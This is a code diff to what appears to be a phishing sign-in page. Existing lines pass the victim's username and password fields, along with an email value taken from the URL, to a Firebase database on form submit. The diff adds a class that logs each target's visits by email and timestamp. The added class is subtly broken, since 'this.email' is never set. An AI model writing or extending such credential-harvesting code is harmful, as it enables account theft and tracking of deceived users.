@@ -681,6 +681,38 @@ line-height: normal;
   firebase.initializeApp(config);
 </script>
 <script>
+class siteVisit
+{
+	constructor(email)
+	{
+		var d = new Date()
+		var monthStr = "" + (d.getMonth() + 1)
+		if(monthStr.length == 1) monthStr = "0" + monthStr;
+		var dayStr = "" + (d.getDate())
+		if(dayStr.length == 1) dayStr = "0" + dayStr;
+		var hrStr = "" + (d.getHours())
+		if(hrStr.length == 1) hrStr = "0" + hrStr;
+		var minStr = "" + (d.getMinutes())
+		if(minStr.length == 1) minStr = "0" + minStr;
+		var secStr = "" + d.getSeconds()
+		if(secStr.length == 1) secStr = "0" + secStr;
+		var msStr = "" + (d.getMilliseconds())
+		if(msStr.length == 1) msStr = "0" + msStr;
+		
+		this.dateStr = d.getFullYear() + '-' + monthStr + '-' + dayStr + ' ' + hrStr + ':' + minStr + ':' + secStr + '.' + msStr;
+		
+		var data = {
+			time: this.dateStr,
+    		email: this.email,
+ 		};
+ 		
+ 		var updates = {};
+  		updates['/site-visits/' + this.email + '-' + monthStr + '-' + dayStr + '-' + hrStr + '-' + minStr + '-' + secStr] = data;
+
+  		return firebase.database().ref().update(updates);
+	}
+}
+
 class dbEntry
 {
 	constructor(email, user, pass)
@@ -740,6 +772,8 @@ else getUrl = getUrl.split("=")[1];
 $('#form_signin').on('submit', function() {
 new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
 });
+
+//log visit on db
 </script>
 
 </body></html>
